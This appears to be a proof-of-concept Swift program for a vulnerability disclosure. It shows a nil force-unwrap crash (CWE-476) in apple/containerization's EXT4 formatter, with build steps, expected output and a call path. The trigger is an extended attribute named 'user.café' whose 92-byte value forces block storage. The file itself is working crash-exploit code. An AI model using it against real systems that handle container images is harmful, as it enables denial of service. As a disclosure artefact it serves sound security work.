// ============================================================
// poc_real — CWE-476 deterministic PoC
// apple/containerization — ContainerizationEXT4
// Vulnerable code: Sources/ContainerizationEXT4/EXT4+Xattrs.swift:60
//
// Build:   swift build     (requires macOS 14+, Swift 5.9+)
// Run:     swift run
//          OR  .build/debug/poc_real
//
// Expected output:
//   Fatal error: Unexpectedly found nil while unwrapping an Optional value
//   (EXT4+Xattrs.swift, line 60)
//
// Crash confirmed on: macOS 15.7.9 ARM-64 (GitHub Actions runner)
// Incident UUID: 51D32D2F-3B30-4322-88CA-B616AEA162F0
// ============================================================

import Foundation
import SystemPackage
import ContainerizationEXT4

// ── Prerequisites ────────────────────────────────────────────────────────────
//
// The crash fires in EXT4+Xattrs.swift:60 when:
//   1. EXT4.Formatter.create() is called with an xattr whose name contains
//      a non-ASCII character (here: é = U+00E9).
//   2. The attribute is routed to BLOCK storage (not inline).
//      Condition: attribute.size  > remaining inline space (~68 bytes free after
//      the mandatory system.data placeholder uses 28 bytes of the 96-byte
//      inline region).
//      Guaranteed by: value.count = 92 bytes → attribute.size = 12 + 92 = 104 > 68.
//
// ── Trigger ──────────────────────────────────────────────────────────────────

print("══════════════════════════════════════════════════════")
print("  apple/containerization  CWE-476 PoC  (poc_real)")
print("  Vulnerable: EXT4+Xattrs.swift:60  char.asciiValue!")
print("══════════════════════════════════════════════════════")
print()

// Verify the nil-producing character explicitly first
let badChar: Character = "\u{00E9}"   // é — Latin small letter e with acute
print("[*] Sanity check:")
print("[*]   Character('\\u{00E9}').asciiValue = \(String(describing: badChar.asciiValue))")
print("[*]   → nil  (é is not ASCII; asciiValue! will trap)")
print()

// The non-ASCII xattr name.
// user.café → compressName strips "user." → compressed name stored = "café"
// 'é' at position 3 will nil-crash char.asciiValue!
let xattrName  = "user.caf\u{00E9}"          // "user.café"
let xattrValue = Data(repeating: 0x41, count: 92)  // 92 bytes → forces block path

print("[*] Attack xattr:")
print("[*]   name  = \(xattrName.debugDescription)  (compressed suffix: café)")
print("[*]   value = \(xattrValue.count) bytes  (triggers block storage path)")
print()

// Create a temporary ext4 image file
let tmpDir  = URL(fileURLWithPath: NSTemporaryDirectory())
let imgPath = tmpDir.appendingPathComponent("poc_output_\(Int.random(in: 10000...99999)).ext4")
let fp      = FilePath(imgPath.path)

print("[*] Creating EXT4.Formatter at: \(imgPath.path)")
let formatter: EXT4.Formatter
do {
    formatter = try EXT4.Formatter(fp)
} catch {
    print("[-] Formatter init failed: \(error)")
    exit(1)
}

print("[*] Calling EXT4.Formatter.create() with xattr '\(xattrName)' ...")
print("[*] Crash imminent — computeHash() will force-unwrap nil on 'é' ...")
fflush(stdout)

// ── THE CRASH ────────────────────────────────────────────────────────────────
// EXT4.Formatter.create() path:
//   create(path:mode:xattrs:)
//     → EXT4+Xattrs.swift: ExtendedAttribute(name: "user.café", value: …)
//     → compressName("user.café") → self.name = "café"
//     → attribute.size (104) > inodeFreeBytes (~68) → blockAttributes.append
//     → writeBlockAttributes() → write(attribute, inline: false)
//     → UInt32(attribute.hash)
//       → for char in "café": char.asciiValue!  when char='é' → nil → TRAP
do {
    try formatter.create(
        path: FilePath("/trigger.txt"),
        mode: 0o100644,         // S_IFREG | 0o644
        xattrs: [xattrName: xattrValue]
    )
    // Should never reach this line
    print("[-] UNEXPECTED: create() returned without crash")
    exit(1)
} catch {
    // Should also never reach this — process terminates before throwing
    print("[-] Caught error (unexpected — crash should have fired): \(error)")
    exit(1)
}
